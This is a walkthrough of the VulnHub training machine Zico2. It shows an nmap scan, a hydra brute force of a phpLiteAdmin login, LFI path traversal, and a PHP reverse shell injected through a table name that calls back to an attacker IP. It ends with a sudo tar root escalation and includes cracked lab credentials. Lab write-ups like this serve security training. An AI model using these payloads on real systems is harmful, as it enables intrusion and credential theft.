# Zico2 | VulnHub
https://www.vulnhub.com/entry/zico2-1,210/

### 1. Scan
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -A -p- -T4 192.168.34.133
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-13 22:01 EST
Nmap scan report for 192.168.34.133
Host is up (0.00083s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Zico's Shop
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35940/tcp6  status
|   100024  1          37574/udp6  status
|   100024  1          53824/udp   status
|_  100024  1          57256/tcp   status
57256/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:85:1D:29 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.83 ms 192.168.34.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.30 seconds
```
The machine is running SSH, an Apache web server and RPC.

### 2. Enumeration
Starting with the website, it is a standard template from something called "Start Bootstrap", which is uses bootstrap - an open-source web framework for building websites.  
Run a quick dirbust:
```bash
┌──(kali㉿kali)-[~/Extra_Tools/dirsearch]
└─$ python3 dirsearch.py -u http://192.168.34.133 -x 403
  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Extra_Tools/dirsearch/logs/errors-21-03-13_22-06-19.log

Target: http://192.168.34.133/
Output File: /home/kali/Extra_Tools/dirsearch/reports/192.168.34.133/_21-03-13_22-06-19.txt

[22:06:19] Starting: 
[22:06:19] 301 -  313B  - /js  ->  http://192.168.34.133/js/
[22:06:23] 200 -    1KB - /LICENSE                                                
[22:06:24] 200 -    1KB - /README.md                                    
[22:06:32] 301 -  314B  - /css  ->  http://192.168.34.133/css/                                                    
[22:06:33] 301 -  318B  - /dbadmin  ->  http://192.168.34.133/dbadmin/
[22:06:33] 200 -  917B  - /dbadmin/
[22:06:35] 200 -    3KB - /gulpfile.js                                                                
[22:06:35] 301 -  314B  - /img  ->  http://192.168.34.133/img/     
[22:06:35] 200 -    8KB - /index                                                                               
[22:06:35] 200 -    8KB - /index.html       
[22:06:36] 200 -    1KB - /js/                                                                          
[22:06:39] 200 -  789B  - /package.json                                                               
[22:06:39] 200 -  789B  - /package 
[22:06:43] 200 -    8KB - /tools
[22:06:44] 200 -    2KB - /vendor/                      
[22:06:44] 200 -    0B  - /view.php                                          
                                                                                                
Task Completed
```
The /dbadmin directory has a test_db.php file which is a phpLiteAdmin 1.9.3 login page. The page only asks for a password, and doesn't appear to do any CSRF tokens. I do run a hydra attack against this page whilst performing further enumeration.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ hydra -P /usr/share/wordlists/rockyou.txt 192.168.34.133 http-post-form "/dbadmin/test_db.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password." -l admin -t 30
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-13 22:28:13
[INFO] Using HTTP Proxy: http://127.0.0.1:8080
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
[DATA] attacking http-post-form://192.168.34.133:80/dbadmin/test_db.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password.
[STATUS] 3736.00 tries/min, 3736 tries in 00:01h, 14340663 to do in 63:59h, 30 active
```
Looking at some of the other accessible pages, there is a view.php file. Searching for this file in some of the page sources reverals it takes a parameter, as shown by this bit of code in the index:
```html
    <aside class="bg-dark">
        <div class="container text-center">
            <div class="call-to-action">
                <h2>Ok... Show me the tools?!</h2>
                <a href="/view.php?page=tools.html" class="btn btn-default btn-xl sr-button">Check them out!</a>
            </div>
        </div>
    </aside>
```
This also allows me to access other files on the system via LFI. For example, accessing `/view.php?page=../../../../../etc/passwd` returns the /etc/passwd file on the system.  
  
Looking back at my hydra session, I can see it has finished.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ hydra -P /usr/share/wordlists/rockyou.txt 192.168.34.133 http-post-form "/dbadmin/test_db.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password." -l admin -t

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-13 22:28:13
[INFO] Using HTTP Proxy: http://127.0.0.1:8080
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
[DATA] attacking http-post-form://192.168.34.133:80/dbadmin/test_db.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password.
[STATUS] 3736.00 tries/min, 3736 tries in 00:01h, 14340663 to do in 63:59h, 30 active
[STATUS] 3525.33 tries/min, 10576 tries in 00:03h, 14333823 to do in 67:46h, 30 active
[80][http-post-form] host: 192.168.34.133   login: admin   password: admin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-13 22:34:24
```
The credentials are just the defaults: `admin:admin`. Guess I should have tried those first and would have saved some time - lesson learned.

### 3. Check out the databases
Once logged in to the database I can retrieve some user credentials:
- root:653F4B285089453FE00E2AAFAC573414  
- zico:96781A607F4E9F5F423AC01F0DAB0EBD
  
Both these hashes crack. The creds are `root:34kroot34` and `zico:zico2215@`. Unfortunately none of these creds will work for SSH.

### 4. Get a shell
Reference: https://www.exploit-db.com/exploits/24044  
PHPLiteAdmin 1.9.3 is vulnerable to an RCE vulnerability which I can use to get a shell on the machine. See HTB_Nineveh for the same thing. First I create a database with a .php extension, then run the following query to create a table within it, containing a field named with my reverse shell php code:
```
CREATE TABLE 'shell' ('<?php $sock=fsockopen("192.168.34.141",9999);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>' TEXT)
```
Accessing this file via the previously-discovered LFI exploit at `/view.php?page=../../../../../../usr/databases/hack.php` triggers the shell.
```bash
┌──(kali㉿kali)-[~/.ssh]
└─$ nc -lvnp 9999                                                                                                                                                                                                                                           130 ⨯
listening on [any] 9999 ...
connect to [192.168.34.141] from (UNKNOWN) [192.168.34.133] 38924
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 5. Enumerate from foothold
There is one user home directory on the machine for zico.
```bash
www-data@zico:/home$ ls -l 
ls -l
total 4
drwxr-xr-x 6 zico zico 4096 Jun 19  2017 zico
```
A lot of the files in this directory are open to being read by other users.
```bash
www-data@zico:/home/zico$ ls -l
ls -l
total 9212
-rw-rw-r--  1 zico zico  504646 Jun 14  2017 bootstrap.zip
drwxrwxr-x 18 zico zico    4096 Jun 19  2017 joomla
drwxrwxr-x  6 zico zico    4096 Aug 19  2016 startbootstrap-business-casual-gh-pages
-rw-rw-r--  1 zico zico      61 Jun 19  2017 to_do.txt
drwxr-xr-x  5 zico zico    4096 Jun 19  2017 wordpress
-rw-rw-r--  1 zico zico 8901913 Jun 19  2017 wordpress-4.8.zip
-rw-rw-r--  1 zico zico    1194 Jun  8  2017 zico-history.tar.gz
```
I figure there is probably more credentials hidden in this file. To narrow down the search I do a grep for the user "zico".
```bash
www-data@zico:/home/zico$ grep -Ri zico .
./wordpress/wp-config.php:define('DB_NAME', 'zico');
./wordpress/wp-config.php:define('DB_USER', 'zico');
./wordpress/wp-config.php:define('DB_HOST', 'zico');
...
```
The wp-config file has been edited to add creds for that user. To get the password I view the file:
```bash
www-data@zico:/home/zico/wordpress$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'zico');

/** MySQL database username */
define('DB_USER', 'zico');

/** MySQL database password */
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');
```
This gives a new set of creds: `zico:sWfCsfJSPV9H3AmQzw8`.

### 6. Escalate to user
With these creds I can log in to the user over SSH.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh zico@192.168.34.133    
zico@192.168.34.133's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

zico@zico:~$ id
uid=1000(zico) gid=1000(zico) groups=1000(zico)
```

### 7. Enumerate from user
Check sudo straight away:
```bash
zico@zico:~$ sudo -l
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip
```
The user can run tar and zip utilities as root without a password.

### 8. Escalate to root
The tar utility does not drop privs and can execute commands as part of it's operation.
```bash
zico@zico:~$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
```